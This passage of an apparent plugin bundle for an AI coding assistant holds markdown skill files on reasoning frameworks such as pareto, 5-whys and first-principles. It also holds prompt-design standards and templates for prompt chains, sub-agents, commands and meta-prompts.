to categorize by urgency/importance, then pareto within Q1 to find highest-impact fixes).\n\n**Feature planning**: Too many feature requests for MVP? (Use pareto to identify 20% of features that deliver 80% of value to users).\n\n**Performance optimization**: Where to focus optimization efforts? (Use pareto to identify the 20% of code paths consuming 80% of resources).\n\n**Test coverage**: Writing tests for large codebase? (Use pareto to identify 20% of functionality that covers 80% of user flows, one-thing to find which test gives the most confidence).\n\n**Sprint planning**: Team overwhelmed with backlog? (Use eisenhower-matrix for task categorization, one-thing to identify the story that unblocks others).\n",
        "plugins/sys-cognition/skills/applying-reasoning/references/problem-analysis.md": "# Problem Analysis Frameworks\n\nProblem analysis frameworks for deep understanding, root causes, and optimal choices. Use when analyzing problems, making constrained choices, or simplifying complexity.\n\n# Frameworks Index\n\nThe problem-analysis skill includes these frameworks:\n\n- 5-whys: Drill to root cause by asking why repeatedly. Use when troubleshooting or solving recurring problems.\n\n- opportunity-cost: Analyze what you give up by choosing an option. Use when making trade-offs or evaluating true cost of choices.\n\n- occams-razor: Find simplest explanation that fits all facts. Use when evaluating competing explanations or approaches.\n\n- via-negativa: Improve by removing rather than adding. Use when simplifying complexity, reducing bloat, or improving systems.\n\n# Routing Logic\n\nWhen to use each framework:\n\n- Use **5-whys** when: Deep root cause analysis of software bugs, performance regressions, deployment failures, or understanding *why* a particular design choice leads to issues. Also useful for investigating recurring problems and preventing their return.\n\n- Use **opportunity-cost** when: When making choices with limited resources (time, budget, engineering effort), comparing alternative technical solutions, or evaluating the true cost of choosing one framework over another.\n\n- Use **occams-razor** when: Evaluating competing solutions to a technical problem (e.g., two different algorithms for the same task), simplifying a complex codebase, or finding the most straightforward explanation for a bug. Useful for debugging and system simplification.\n\n- Use **via-negativa** when: Simplifying a complex API, refactoring by removing unnecessary code/features, optimizing performance by eliminating bottlenecks, or improving a system by reducing points of failure.\n\nMultiple frameworks can be combined:\n\n- **5-whys + occams-razor**: Drilling down to the true root cause of a bug, then finding the simplest possible fix.\n- **opportunity-cost + via-negativa**: Evaluating trade-offs between solutions, then considering what complexity can be removed.\n- **occams-razor + via-negativa**: Finding the simplest approach by removing unnecessary complexity.\n\n## Example Applications\n\n**Root cause analysis**: Production outage keeps happening? (Use 5-whys to drill into root cause, occams-razor to find simplest fix).\n\n**Technology selection**: Choosing between React vs Vue for new project? (Use opportunity-cost to evaluate what you give up with each choice).\n\n**Debugging**: Strange intermittent bug? (Use 5-whys to trace root cause, occams-razor to find simplest explanation that fits all symptoms).\n\n**API simplification**: API is too complex and hard to use? (Use via-negativa to identify what can be removed, occams-razor to find simplest design that works).\n\n**Performance optimization**: System is slow, where to focus? (Use pareto to find bottlenecks, via-negativa to identify what can be removed, occams-razor for simplest optimization).\n\n**Refactoring**: Codebase is bloated and hard to maintain? (Use via-negativa to identify what can be removed, opportunity-cost to weigh refactoring vs rewrite).\n\n**Architecture decision**: Monolith vs microservices? (Use 5-whys to understand actual problem being solved, occams-razor to find simplest solution, opportunity-cost to evaluate trade-offs).\n",
        "plugins/sys-cognition/skills/applying-reasoning/references/strategic.md": "# Strategic Thinking Frameworks\n\nStrategic thinking frameworks for long-term perspective, big-picture analysis, and understanding temporal impact. Use for any decision requiring strategic thought, from technical architecture to business planning.\n\n# Frameworks Index\n\nThe strategic thinking skill includes these frameworks:\n\n- first-principles: Break down to fundamentals and rebuild from base truths. Use when challenging assumptions or avoiding reasoning by analogy.\n\n- inversion: Solve problems backwards - identify what would guarantee failure, then avoid those things. Use for risk assessment and robust planning.\n\n- second-order: Think through consequences of consequences. Use when understanding ripple effects and unintended consequences.\n\n- swot: Map strengths, weaknesses, opportunities, and threats. Use for strategic positioning and comprehensive situation analysis.\n\n- 10-10-10: Evaluate decisions across three time horizons (10 minutes, 10 months, 10 years). Use when overcoming present bias and clarifying long-term impact.\n\n# Routing Logic\n\nWhen to use each framework:\n\n- Use **first-principles** when: You need to challenge assumptions about a system's core components, designing from scratch (e.g., a new data structure), understanding fundamental concepts (e.g., event loops, type systems), or breaking down any complex idea to its irreducible minimum.\n\n- Use **inversion** when: Identifying potential failure points in a design (e.g., 'what would make this API break?'), anticipating bugs in a new feature, building robust systems by avoiding known pitfalls, or preventing a project from going off track.\n\n- Use **second-order** when: Making decisions with cascading effects, implementing policies with ripple impacts, evaluating the long-term consequences of a technical choice (e.g., adopting a new framework), or understanding how a bug fix might create new problems elsewhere.\n\n- Use **swot** when: Analyzing the strategic positioning of a new product feature, assessing the competitive landscape, evaluating internal/external factors for a project's success, or understanding the overall context of a problem.\n\n- Use **10-10-10** when: Facing short-term vs long-term conflicts (e.g., quick fix vs. proper refactor), overcoming present bias in architectural decisions, clarifying what actually matters over time in a career path, or evaluating the lasting impact of a design choice.\n\nMultiple frameworks can be combined:\n\n- **first-principles + inversion**: Rebuilding a core system component while systematically avoiding potential failure modes.\n- **second-order + 10-10-10**: Understanding the cascading impacts of a platform change across different time horizons.\n- **swot + first-principles**: Strategic analysis based on fundamental truths, challenging existing assumptions about the market or technology.\n\n## Example Applications\n\n**Business decision**: Should we expand to new market? (Use swot for positioning, second-order for consequences)\n\n**Product strategy**: Build vs buy for a critical component? (Use first-principles to rebuild from fundamentals, inversion to identify failure modes)\n\n**Technical architecture**: Microservices vs monolith for a new platform? (Use first-principles to challenge assumptions about scale and coupling, inversion for identifying critical points of failure in each approach).\n\n**Personal growth**: How to learn a new programming language effectively? (Use first-principles for core concepts, inversion for common pitfalls to avoid).\n\n**System design**: Designing a caching layer for high-traffic API? (Use first-principles to understand what caching actually needs to accomplish, inversion to identify what would make caching fail or worsen performance).\n",
        "plugins/sys-cognition/skills/architecting-prompts/SKILL.md": "---\nname: architecting-prompts\ndescription: \"Applies 2026 Complexity-Based Guidance standards with Attention Management, Sycophancy Prevention, and XML/Markdown decision matrix. Provides theory, patterns, and quality evaluation criteria for AI prompt design. Use when designing, optimizing, or auditing AI prompts, system instructions, or multi-stage chains. Do not use for generating prompt files, basic conversational AI, or single-step interactions.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep]\n---\n\n# Prompt Architecture & Design Standards\n\n## Operational Protocol\n\n1. **Analyze Intent**: Determine if the goal is Drafting, Optimizing, or Auditing a prompt.\n2. **Consult Standards**: PROACTIVELY load `references/core-standards.md` for Attention Management rules.\n3. **Select Pattern (Signal-to-Noise Rule)**:\n   - **Markdown-First** (Default): Use for 80% of tasks.\n   - **Hybrid XML**: Use ONLY if:\n     - Data Isolation (>50 lines raw data)\n     - Strict Constraints (NEVER/MUST rules)\n     - Internal Monologue (Complex reasoning)\n4. **Apply Theory**: Use `references/optimization.md` for refinement workflows.\n5. **Verify**: Apply `references/quality.md` gates before final output.\n\n## Core Principles (Quick Reference)\n\n### Attention Management\nUse Markdown headers for hierarchy. XML tags (Max 15, No Nesting) ONLY for semantic data isolation or thinking scaffolding.\n\n### Sycophancy Prevention (Truth-First)\n\nIf user suggests flawed path  CONTRADICT immediately. No \"Great idea!\" or superlatives. Speak in code, files, commands.\n\n### Signal-to-Noise Rule\n- **Default**: Markdown (80% of prompts) - fewer tokens, Claude-native\n- **Upgrade to XML/Markdown hybrid** only when:\n  - Data Isolation: >50 lines of raw data\n  - Constraint Weight: NEVER/MUST rules that cannot be broken\n  - Internal Monologue: Complex reasoning requiring step-by-step\n\n## Knowledge Index (Progressive Disclosure)\n\n| Reference | Purpose | Load When |\n|:----------|:--------|:----------|\n| **core-standards.md** | Attention, Sycophancy, Quota, XML/MD matrix | ALWAYS consult first |\n| **design-patterns.md** | CoT, Few-Shot, Taxonomy, Structural patterns | Selecting technique |\n| **optimization.md** | Systematic refinement workflow | Improving existing prompts |\n| **quality.md** | Production quality gates | Final verification |\n| **anti-patterns.md** | Common mistakes to avoid | Prevention |\n| **taxonomy.md** | Single vs Chain vs Meta categorization | Storage/planning |\n| **execution-protocol.md** | Standard completion reporting | Structured output |\n\n## Design Patterns\n\n### Approved Patterns\n- **Chain of Thought (CoT)**\n- **Few-Shot Learning**\n- **Structured Output**\n- **Constraint Encoding**\n\n## Success Criteria\n\nA prompt meets 2026 standards when:\n- [ ] Uses Markdown headers for hierarchy (default)\n- [ ] XML tags are < 15 and never nested\n- [ ] Instructions are specific, actionable, and truth-focused\n- [ ] Examples (if any) are isolated in `<example>` tags\n- [ ] Reasoning is isolated in `<thinking>` blocks (if needed)\n- [ ] Quality gate checklist is included\n- [ ] Output format is clearly specified\n\n**Note**: For generating .md prompt files for Claude-to-Claude pipelines, use `generating-prompts` skill.\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/agent-sub.md": "# Sub-Agent Template\n\nYou are a **{[Role]} specialist** for Claude Code. You excel at **{[primary competency]}**.\n\n**=== CRITICAL: [MODE] MODE - [KEY RESTRICTION] ===**\n\nThis is a **[MODE]** {task type}. You are STRICTLY PROHIBITED from:\n- [Forbidden action 1]\n- [Forbidden action 2]\n- [Forbidden action 3]\n- [Forbidden action 4]\n\nYour role is EXCLUSIVELY to **{primary function}**. You {do not have access/have limited access} to {tools/resources}.\n\n## Guidelines\n\n- {Guideline 1 with specific action}\n- {Guideline 2 with specific action}\n- {Guideline 3 with specific action}\n\n## Required Output\n\n{Describe what the agent should return}\n\n<example_correct>\n{Example of correct task execution}\n</example_correct>\n\n<example_incorrect>\n{Example of incorrect execution}\n**Reasoning:** {Why this is wrong}\n</example_incorrect>\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain-summary.md": "# Chain: {Topic Name}\n\n## Objective\n{Describe the primary goal of this multi-step workflow}\n\n## Workflow Status\n- [ ] Step 1: Research ({research_status})\n- [ ] Step 2: Plan ({plan_status})\n- [ ] Step 3: Execute ({execute_status})\n- [ ] Step 4: Refine ({refine_status})\n\n## Intermediate Results\n{List links to files in the outputs/ directory}\n- Research Findings - Analysis and research findings\n- Implementation Plan - Detailed execution plan\n- Final Deliverable - Completed implementation\n\n## Success Criteria\n{How will we know this entire chain was successful?}\n- [ ] {Criterion 1}\n- [ ] {Criterion 2}\n\n---\n*Created via /create-prompt*\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/execute.md": "# Execute Step Template\n\nUse this template for the **execution phase** of a prompt chain workflow.\n\n## Step Purpose\n\nPerform the actual work based on the implementation plan.\n\n---\n\n## Template\n\n```markdown\n---\nchain-position: 3\nchain-name: {{CHAIN_NAME}}\nstep-type: execute\ndepends-on: [step-2-plan]\noutputs-to: step-4-refine\n---\n\n# Execute: {{TOPIC}}\n\n# Context\n## Implementation Plan\n{{PLAN_OUTPUT}}\n\n<workflow>\n## Phase 1: Setup\n1. Verify prerequisites are met\n2. Prepare necessary resources\n3. Confirm execution approach\n\n## Phase 2: Execute\n1. Perform planned steps sequentially\n2. Document progress and decisions\n3. Handle issues as they arise\n\n## Phase 3: Verify\n1. Check deliverables against success criteria\n2. Validate output quality\n3. Document completion status\n</workflow>\n\n<output_format>\n## Execution Results\n\n### Completed Deliverables\n- {{DELIVERABLE_1}}\n- {{DELIVERABLE_2}}\n\n### Execution Log\n| Step | Status | Notes |\n|:-----|:-------|:------|\n| {{STEP_1}} |  Complete | {{NOTES}} |\n| {{STEP_2}} |  Complete | {{NOTES}} |\n\n### Issues Encountered\n{{ISSUES_OR_NONE}}\n\n### Output Artifacts\n- {{ARTIFACT_PATH_1}}\n- {{ARTIFACT_PATH_2}}\n</output_format>\n```\n\n---\n\n## Usage Notes\n\n- This step receives the plan and produces actual work output\n- Document all significant decisions made during execution\n- Flag issues for the Refine step to address\n- Be thorough in deliverable documentation\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/plan.md": "# Plan Step Template\n\nUse this template for the **planning phase** of a prompt chain workflow.\n\n## Step Purpose\n\nCreate a structured plan or strategy based on research findings.\n\n---\n\n## Template\n\n```markdown\n---\nchain-position: 2\nchain-name: {{CHAIN_NAME}}\nstep-type: plan\ndepends-on: [step-1-research]\noutputs-to: step-3-execute\n---\n\n# Plan: {{TOPIC}}\n\n# Context\n## Research Findings\n{{RESEARCH_OUTPUT}}\n\n<workflow>\n## Phase 1: Analyze Requirements\n1. Review research findings\n2. Identify constraints and dependencies\n3. Define success criteria\n\n## Phase 2: Design Solution\n1. Outline approach options\n2. Evaluate trade-offs\n3. Select optimal strategy\n\n## Phase 3: Create Roadmap\n1. Break into actionable steps\n2. Estimate effort/complexity\n3. Define deliverables\n</workflow>\n\n<output_format>\n## Implementation Plan\n\n### Objective\n{{CLEAR_OBJECTIVE}}\n\n### Approach\n{{SELECTED_APPROACH}}\n\n### Steps\n1. {{STEP_1}}\n2. {{STEP_2}}\n3. {{STEP_3}}\n\n### Success Criteria\n- {{CRITERION_1}}\n- {{CRITERION_2}}\n\n### Risks & Mitigations\n| Risk | Mitigation |\n|:-----|:-----------|\n| {{RISK_1}} | {{MITIGATION_1}} |\n</output_format>\n```\n\n---\n\n## Usage Notes\n\n- This step receives research output and produces execution plan\n- Be specific about deliverables and success criteria\n- Consider risks and dependencies\n- Output should be actionable by the Execute step\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/refine.md": "# Refine Step Template\n\nUse this template for the **refinement phase** of a prompt chain workflow.\n\n## Step Purpose\n\nReview execution results and improve the output quality.\n\n---\n\n## Template\n\n```markdown\n---\nchain-position: 4\nchain-name: {{CHAIN_NAME}}\nstep-type: refine\ndepends-on: [step-3-execute]\noutputs-to: final-output\n---\n\n# Refine: {{TOPIC}}\n\n# Context\n## Execution Results\n{{EXECUTE_OUTPUT}}\n\n## Original Success Criteria\n{{SUCCESS_CRITERIA}}\n\n<workflow>\n## Phase 1: Review\n1. Compare output against success criteria\n2. Identify quality issues or gaps\n3. Gather improvement suggestions\n\n## Phase 2: Improve\n1. Address identified issues\n2. Enhance clarity and completeness\n3. Optimize for target audience\n\n## Phase 3: Finalize\n1. Perform final quality check\n2. Format for delivery\n3. Document lessons learned\n</workflow>\n\n<output_format>\n## Refined Output\n\n### Final Deliverable\n{{REFINED_CONTENT}}\n\n### Improvements Made\n- {{IMPROVEMENT_1}}\n- {{IMPROVEMENT_2}}\n\n### Quality Assessment\n| Criterion | Status | Notes |\n|:----------|:-------|:------|\n| {{CRITERION_1}} |  Met | {{NOTES}} |\n| {{CRITERION_2}} |  Met | {{NOTES}} |\n\n### Lessons Learned\n{{LESSONS_FOR_FUTURE}}\n</output_format>\n```\n\n---\n\n## Usage Notes\n\n- This step reviews and improves the execution output\n- Focus on quality improvement, not starting over\n- Document improvements for transparency\n- Capture lessons for future chain executions\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/research.md": "# Research Step Template\n\nUse this template for the **research phase** of a prompt chain workflow.\n\n## Step Purpose\n\nGather information, analyze requirements, and identify key factors before planning.\n\n---\n\n## Template\n\n```markdown\n---\nchain-position: 1\nchain-name: {{CHAIN_NAME}}\nstep-type: research\ndepends-on: []\noutputs-to: step-2-plan\n---\n\n# Research: {{TOPIC}}\n\n# Context\n{{BACKGROUND_CONTEXT}}\n\n<workflow>\n## Phase 1: Initial Discovery\n1. Identify key concepts and terminology\n2. Search for authoritative sources\n3. Gather initial findings\n\n## Phase 2: Deep Investigation\n1. Investigate specific aspects in detail\n2. Cross-reference sources\n3. Verify claims and collect examples\n\n## Phase 3: Synthesis\n1. Analyze patterns and insights\n2. Identify gaps or contradictions\n3. Summarize key findings\n</workflow>\n\n<output_format>\n## Research Findings\n\n### Key Discoveries\n- {{DISCOVERY_1}}\n- {{DISCOVERY_2}}\n\n### Knowledge Gaps\n- {{GAP_1}}\n\n### Sources\n- {{SOURCE_1}}\n\n### Recommendations for Planning\n{{PLANNING_RECOMMENDATIONS}}\n</output_format>\n```\n\n---\n\n## Usage Notes\n\n- This step produces findings that feed into the Plan step\n- Focus on gathering facts, not making decisions\n- Document sources for traceability\n- Identify gaps that need addressing in later steps\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/command-complex.md": "# {Command Title}: {Brief Description}\n\nYou are an **{Elite [Role] specialist}** specializing in **{domain}**. Your expertise lies in **{specific competencies}**.\n\n**Your Strengths:**\n- {Strength 1}\n- {Strength 2}\n- {Strength 3}\n\n**Success Criteria:**\n1. {Success criterion 1}\n2. {Success criterion 2}\n3. {Success criterion 3}\n\n---\n\n## CRITICAL CONSTRAINTS\n\n**=== ABSOLUTE RULES  NO EXCEPTIONS ===**\n\n1. **NEVER skip [Phase X exploration/diagnosis].**\n   - *Why:* {Consequence of skipping}\n\n2. **NEVER ask questions across multiple phases.**\n   - *Why:* {Reason} All questions MUST be consolidated into Phase {N}.\n\n3. **NEVER begin [implementation/execution] without explicit user approval.**\n   - *Why:* Premature execution wastes resources on potentially wrong approaches.\n\n4. **NEVER implement [architecture/approach] that wasn't presented and selected by the user.**\n   - *Why:* User must own architecture decisions for maintainability.\n\n5. **ALWAYS delegate [exploration/planning/review] to specialized sub-agents.**\n   - *Why:* Specialized agents produce higher quality results than generalist approaches.\n\n---\n\n## Dynamic Context\n\n<env>\n{Context Variable 1}: {Value}\n{Context Variable 2}: {Value}\nWorking Directory: {{CWD}}\nGit Repository: {{IS_GIT_REPO}}\nCurrent Branch: {{GIT_BRANCH}}\nDate: {{DATE}}\n</env>\n\n---\n\n## EXECUTION PROTOCOL\n\n**MANDATORY PREREQUISITE:** You MUST follow these phases in exact order. Skipping or reordering phases will result in poor implementations.\n\n```\nPhase Order: 1  2  3  4  5  6  7\n                               \n            READ READ ASK READ WRITE READ READ\n```\n\n---\n\n### Phase 1: {Phase 1 Name}\n**Goal:** {Phase 1 objective}\n**Mode:** READ-ONLY\n**Interaction:** None\n\n1. Create TodoWrite checklist with all 7 phases\n2. Parse and comprehend the {request/input}\n3. Form initial mental model of requirements\n4. Document unclear aspects for Phase 3 questioning\n\n---\n\n### Phase 2: {Phase 2 Name}\n**Goal:** {Phase 2 objective}\n**Mode:** READ-ONLY (via {Agent Type} agents)\n**Interaction:** None\n\n<sub_agents>\n**{Agent Type} Agent:** {Agent description}. {Capabilities}. {Mode}.\n\n**{Agent Type 2} Agent:** {Agent description}. {Capabilities}. {Mode}.\n\n**{Agent Type 3} Agent:** {Agent description}. {Capabilities}. {Mode}.\n\n**=== CRITICAL: ALL SUB-AGENTS ARE READ-ONLY  NO FILE MODIFICATIONS ===**\n</sub_agents>\n\n1. Launch {N} {Agent Type} agents **in parallel** via Task tool:\n   - Agent 1: {Task description}\n   - Agent 2: {Task description}\n   - Agent 3: {Task description}\n\n   Each agent returns {output specification}.\n\n2. Read ALL files identified by agents\n3. Synthesize findings into comprehensive mental model\n4. Identify gaps  feed into Phase 3 questions\n\n<example_correct>\n{Example of correct parallel agent execution}\n</example_correct>\n\n<example_incorrect>\n{Example of incorrect approach}\n**Reasoning:** {Why this is incorrect}\n</example_incorrect>\n\n---\n\n### Phase 3: {Phase 3 Name}\n**Goal:** {Phase 3 objective}\n**Mode:** READ-ONLY\n**Interaction:** HIGH (comprehensive Q&A)\n\n**=== CRITICAL: THIS IS THE ONLY QUESTION-ASKING PHASE ===**\n\n1. Compile ALL questions from Phases 1-2 into a single organized list:\n   - {Category 1}:\n     - {Question 1}\n     - {Question 2}\n   - {Category 2}:\n     - {Question 3}\n     - {Question 4}\n\n2. Present questions in numbered, categorized format\n3. WAIT for complete answers before proceeding\n\n<example_correct>\n### Questions Before {Action}\n\n**{Category}:**\n1. {Question}\n2. {Question}\n\n**{Category}:**\n3. {Question}\n4. {Question}\n</example_correct>\n\n<example_incorrect>\n[During Phase 5] \"{Question}\"\n**Reasoning:** All questions must be asked in Phase 3. Asking questions during implementation breaks flow.\n</example_incorrect>\n\n---\n\n### Phase 4: {Phase 4 Name}\n**Goal:** {Phase 4 objective}\n**Mode:** READ-ONLY (via {Agent Type} agents)\n**Interaction:** MEDIUM ({interaction type})\n\n1. Launch {N} {Agent Type} agents **in parallel** via Task tool:\n   - Approach A: {Description}\n   - Approach B: {Description}\n   - Approach C: {Description}\n\n2. Present to user with structured comparison:\n\n### Architecture Options\n\n| Approach | Pros | Cons | Estimated Complexity |\n|----------|------|------|---------------------|\n| A: {Name} | {Pros} | {Cons} | {Complexity} |\n| B: {Name} | {Pros} | {Cons} | {Complexity} |\n| C: {Name} | {Pros} | {Cons} | {Complexity} |\n\n**Recommendation:** {Approach} because {reasoning}\n\nWhich approach do you prefer?\n\n3. WAIT for user selection before proceeding\n\n---\n\n### Phase 5: {Phase 5 Name}\n**Goal:** {Phase 5 objective}\n**Mode:** WRITE\n**Interaction:** None (pure execution)\n\n**=== CRITICAL: REQUIRES EXPLICIT USER APPROVAL ===**\n\n**MANDATORY PREREQUISITE  VERIFY BEFORE STARTING:**\n- [ ] User has explicitly selected an {architecture/approach}\n- [ ] All Phase 3 questions have been answered\n- [ ] {Mental model/requirements} is complete\n- [ ] You have re-read critical files from Phase 2\n\n**Why this is non-negotiable:** {Consequence of skipping prerequisites}\n\n1. Confirm explicit user approval to proceed\n2. Re-read critical files identified in Phase 2\n3. Implement following the chosen {architecture/approach} EXACTLY\n4. Follow existing {codebase/project} conventions strictly:\n   - {Convention 1}\n   - {Convention 2}\n   - {Convention 3}\n5. Update TodoWrite as each component completes\n\n<example_correct>\n\"{Description of correct execution}\"\n</example_correct>\n\n<example_incorrect>\n\"{Description of incorrect execution}\"\n**Reasoning:** {Why this is incorrect}\n</example_incorrect>\n\n---\n\n### Phase 6: {Phase 6 Name}\n**Goal:** {Phase 6 objective}\n**Mode:** READ-ONLY (via {Agent Type} agents)\n**Interaction:** MEDIUM (findings + decision)\n\n1. Launch {N} {Agent Type} agents **in parallel** via Task tool:\n   - Reviewer 1: {Focus area 1}\n   - Reviewer 2: {Focus area 2}\n   - Reviewer 3: {Focus area 3}\n\n2. Consolidate findings into severity-ranked list:\n\n### Review Findings\n\n**Critical (must fix):**\n- [Issue]: [Location]  [Reason]\n\n**Recommended (should fix):**\n- [Issue]: [Location]  [Reason]\n\n**Optional (nice to have):**\n- [Issue]: [Location]  [Reason]\n\nHow would you like to proceed?\n- A) Fix all issues\n- B) Fix critical + recommended only\n- C) Fix critical only\n- D) Ship as-is\n\n3. Implement fixes based on user decision\n\n---\n\n### Phase 7: {Phase 7 Name}\n**Goal:** {Phase 7 objective}\n**Mode:** READ-ONLY\n**Interaction:** None\n\n1. Mark all TodoWrite items complete\n2. Generate structured summary:\n\n## Implementation Complete\n\n**Built:** {Feature/result description}\n\n**Key Decisions:**\n- {Decision 1}: {Reasoning}\n- {Decision 2}: {Reasoning}\n\n**Files Modified:**\n- `path/to/file.ts`  [Change summary]\n\n**Next Steps (if any):**\n- [Suggested follow-up work]\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/meta/generator.md": "# Prompt Generator Template\n\nUse this **meta-prompt** to generate new prompts for specific tasks.\n\n## Purpose\n\nThis is a true meta-prompt: it produces **prompts as output**, not task content.\n\n---\n\n## Template\n\n```markdown\n# Prompt Generator\n\n<role>\nYou are an expert prompt engineer. Your task is to create a high-quality, \nproduction-ready prompt based on the requirements provided.\n</role>\n\n# Context\n## Task Requirements\n{{TASK_DESCRIPTION}}\n\n## Target AI Model\n{{TARGET_MODEL_OR_GENERAL}}\n\n## Intended Use\n{{HOW_PROMPT_WILL_BE_USED}}\n\n## Constraints\n{{ANY_CONSTRAINTS_OR_REQUIREMENTS}}\n\n<workflow>\n1. Analyze the task requirements carefully\n2. Determine the optimal prompt structure (Pure Markdown or Hybrid XML/Markdown)\n3. Define the role and persona for the target AI\n4. Create clear, unambiguous instructions\n5. Add concrete examples if beneficial\n6. Specify the expected output format\n7. Include appropriate constraints\n</workflow>\n\n<output_format>\n## Generated Prompt\n\n\\`\\`\\`markdown\n[The complete, ready-to-use prompt goes here]\n\\`\\`\\`\n\n## Prompt Metadata\n\n- **Type**: {{SINGLE_OR_CHAIN_STEP}}\n- **Target Model**: {{MODEL}}\n- **Use Case**: {{BRIEF_DESCRIPTION}}\n- **Estimated Tokens**: {{APPROXIMATE_SIZE}}\n\n## Usage Instructions\n\n{{HOW_TO_USE_THE_GENERATED_PROMPT}}\n</output_format>\n```\n\n---\n\n## When to Use\n\nUse this meta-prompt when you need to:\n- Create a new reusable prompt for a specific task\n- Generate prompts for delegation to other AI agents\n- Design prompts for unfamiliar domains\n\n## Output\n\nThe output of this meta-prompt is a **new prompt** that can be:\n- Saved to `.cattoolkit/prompts/` for reuse\n- Used immediately for a task\n- Further refined with the prompt-optimizer meta-prompt\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/meta/optimizer.md": "# Prompt Optimizer Template\n\nUse this **meta-prompt** to improve and refine existing prompts.\n\n## Purpose\n\nThis is a true meta-prompt: it analyzes a prompt and produces an **improved version**.\n\n---\n\n## Template\n\n```markdown\n# Prompt Optimizer\n\n<role>\nYou are an expert prompt engineer specializing in prompt optimization. \nYour task is to analyze the provided prompt and create an improved version \nthat produces better, more consistent results.\n</role>\n\n# Context\n## Original Prompt\n\\`\\`\\`\n{{ORIGINAL_PROMPT}}\n\\`\\`\\`\n\n## Issues or Concerns\n{{KNOWN_ISSUES_OR_NONE}}\n\n## Sample Outputs (if available)\n{{EXAMPLE_OUTPUTS_SHOWING_PROBLEMS}}\n\n## Optimization Goals\n{{WHAT_SHOULD_BE_IMPROVED}}\n\n<workflow>\n1. Analyze the original prompt structure and intent\n2. Identify weaknesses or ambiguities\n3. Review sample outputs for patterns of failure\n4. Apply prompt engineering best practices:\n   - Clearer role definition\n   - More specific instructions\n   - Better examples\n   - Improved output formatting\n   - Appropriate XML/Markdown structure\n5. Create optimized version\n6. Document the changes and rationale\n</workflow>\n\n<output_format>\n## Optimized Prompt\n\n\\`\\`\\`markdown\n[The improved, ready-to-use prompt goes here]\n\\`\\`\\`\n\n## Changes Made\n\n| Issue | Change | Rationale |\n|:------|:-------|:----------|\n| {{ISSUE_1}} | {{CHANGE_1}} | {{WHY_1}} |\n| {{ISSUE_2}} | {{CHANGE_2}} | {{WHY_2}} |\n\n## Expected Improvements\n\n- {{IMPROVEMENT_1}}\n- {{IMPROVEMENT_2}}\n\n## Testing Recommendations\n\n{{HOW_TO_VERIFY_THE_OPTIMIZATION_WORKED}}\n</output_format>\n```\n\n---\n\n## When to Use\n\nUse this meta-prompt when you need to:\n- Fix a prompt that produces inconsistent results\n- Reduce false positives or improve accuracy\n- Adapt a prompt for a different use case\n- Apply best practices to legacy prompts\n\n## Optimization Checklist\n\n- [ ] Role clearly defined?\n- [ ] Instructions unambiguous?\n- [ ] Examples concrete and helpful?\n- [ ] Output format specified?\n- [ ] Constraints appropriate (not over/under-constrained)?\n- [ ] XML tags limited to 15 max?\n- [ ] No nested XML?\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/single-prompt.md": "# {Prompt Title}\n\n{Brief description of what this prompt does and when to use it.}\n\n## When to Use\n\nUse this prompt when you need to:\n- {USE_CASE_1}\n- {USE_CASE_2}\n- {USE_CASE_3}\n\n## Input\n\n**Input Description:**\n{INPUT_DESCRIPTION}\n\n## Instructions\n\n{CLEAR_STEP_BY_STEP_INSTRUCTIONS}\n\n## Output Format\n\n{EXPECTED_OUTPUT_STRUCTURE}\n\n## Quality Checks\n\n- [ ] {CHECK_1}\n- [ ] {CHECK_2}\n- [ ] {CHECK_3}\n",
        "plugins/sys-cognition/skills/architecting-prompts/assets/templates/tool-prompt.md": "# Tool Prompt Template\n\n> **Description:** {Brief description of what the tool does}\n\n> **Instructions:**\n> - {Instruction 1}\n> - {Instruction 2}\n> - {Instruction 3}\n\n**When NOT to use:** {When this tool should not be used}\n\n**When to use:** {When this tool should be used}\n\n**Inputs:** {What parameters are required}\n\n**Outputs:** {What the tool returns}\n\n<example_correct>\n{Example of correct tool usage}\n</example_correct>\n\n<example_incorrect>\n{Example of incorrect tool usage}\n**Reasoning:** {Why this is incorrect}\n</example_incorrect>\n\n## Protocol-Specific Templates\n\n### For Multi-Step Tools\n\n**MANDATORY PREREQUISITE - THIS IS A HARD REQUIREMENT**\nYou MUST {prerequisite step} BEFORE {main action}.\n\n**Why:** {Explanation of why this is necessary}\n\n**Flow:**\n1. {Step 1}\n2. {Step 2} (**REQUIRED**)\n3. {Step 3}\n\n### For Specialized Tools\n\n**Domain:** {Specific domain (e.g., Database, API, CLI)}\n**Expertise:** {What the tool excels at}\n\nYour role is to {primary function}.\n\n### For Interactive Tools\n\n**Usage:**\n- {Usage pattern 1}\n- {Usage pattern 2}\n- {Usage pattern 3}\n\n**Error Handling:**\n- If {error condition}, then {action}\n- If {error condition}, then {action}\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/anti-patterns.md": "# Research & Prompting Anti-Patterns\n\nA catalog of known pitfalls, mistakes, and red flags to avoid.\n\n## Prompting Pitfalls\n\n### 1. The \"XML Soup\"\n**What**: Excessive or nested XML tags.\n**Why**: Increases token cost and confuses the model's structural parsing.\n**Prevention**: Limit to 15 flat tags. Use Markdown for content, XML only for containers.\n\n### 2. Example Leakage\n**What**: AI follows example content instead of instructions.\n**Why**: Examples not properly isolated from the task instruction.\n**Prevention**: Always wrap individual examples in flat `<example>` tags.\n\n### 3. Vague Instructions\n**What**: \"Analyze this\", \"Check for bugs\", \"Be helpful\".\n**Why**: Lack of specific success criteria leads to generic, inconsistent output.\n**Prevention**: Use specific action verbs and define exactly what \"analysis\" or \"bugs\" look like.\n\n### 4. Over-Engineering\n**What**: Adding 20 constraints and 10 examples for a simple task.\n**Why**: Dilutes the attention of the model and risks hitting token limits.\n**Prevention**: Start with Pure Markdown. Add complexity only where testing proves it's needed.\n\n## Research Pitfalls\n\n### 1. Scope Assumptions\n**What**: Assuming evidence of absence is evidence of absence.\n**Example**: \"I didn't find a config file, so it doesn't exist.\"\n**Prevention**: Explicitly verify all possible scopes (Global, Project, Local, Environment).\n\n### 2. Deprecation 